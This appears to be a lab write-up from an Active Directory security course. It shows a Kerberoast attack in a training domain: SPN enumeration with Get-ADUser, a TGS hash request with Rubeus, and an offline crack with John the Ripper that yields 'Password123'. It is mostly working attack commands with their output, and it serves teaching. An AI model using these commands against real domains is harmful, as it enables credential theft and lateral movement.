# HANDS ON 6:

```
Using the Kerberoast attack, get the clear-text password for an account in us.techcorp.local
domain.

```
## Index of content

  1. [Kerberoast detection](#kerberoast-detection)
  2. [Kerberoast attack](#kerberoast-attack)

## Kerberoast Detection

```
PS C:\AD\Tools\InviShell> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName


DistinguishedName    : CN=krbtgt,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : False
GivenName            :
Name                 : krbtgt
ObjectClass          : user
ObjectGUID           : 6dce7bd9-287f-4ab3-b5ba-0bb1e8aab391
SamAccountName       : krbtgt
ServicePrincipalName : {kadmin/changepw}
SID                  : S-1-5-21-210670787-2521448726-163245708-502
Surname              :
UserPrincipalName    :

DistinguishedName    : CN=serviceaccount,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : True
GivenName            : service
Name                 : serviceaccount
ObjectClass          : user
ObjectGUID           : 8a97f972-51b1-4647-8b73-628f5da8ca01
SamAccountName       : serviceaccount
ServicePrincipalName : {USSvc/serviceaccount}
SID                  : S-1-5-21-210670787-2521448726-163245708-1144
Surname              : account
UserPrincipalName    : serviceaccount

DistinguishedName    : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : True
GivenName            : app
Name                 : appsvc
ObjectClass          : user
ObjectGUID           : 4f66bb3a-d07e-40eb-83ae-92abcb9fc04c
SamAccountName       : appsvc
ServicePrincipalName : {appsvc/us-jump.us.techcorp.local}
SID                  : S-1-5-21-210670787-2521448726-163245708-4601
Surname              : svc
UserPrincipalName    : appsvc

DistinguishedName    : CN=Support38User,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : True
GivenName            : Support38
Name                 : Support38User
ObjectClass          : user
ObjectGUID           : 95b86096-a51e-4255-b455-55c695434b09
SamAccountName       : Support38user
ServicePrincipalName : {us/Pwned}
SID                  : S-1-5-21-210670787-2521448726-163245708-16128
Surname              : user
UserPrincipalName    : Support38user

```
## Kerberoas Attack

Obtain TGS ticket with RUbeus

```
C:\Users\studentuser34>C:\AD\Tools\Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec /outfile:hashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : serviceaccount
[*] Target Domain          : us.techcorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://US-DC.us.techcorp.local/DC=us,DC=techcorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=serviceaccount)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\Users\studentuser34\hashes.txt

[*] Roasted hashes written to : C:\Users\studentuser34\hashes.txt

```

Perform brute force attack over local hashes:

```
C:\Users\studentuser34>C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist="C:\AD\Tools\kerberoast\10k-worst-pass.txt" hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)
1g 0:00:00:00 DONE (2023-01-17 10:56) 71.42g/s 54857p/s 54857c/s 54857C/s password..9999
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
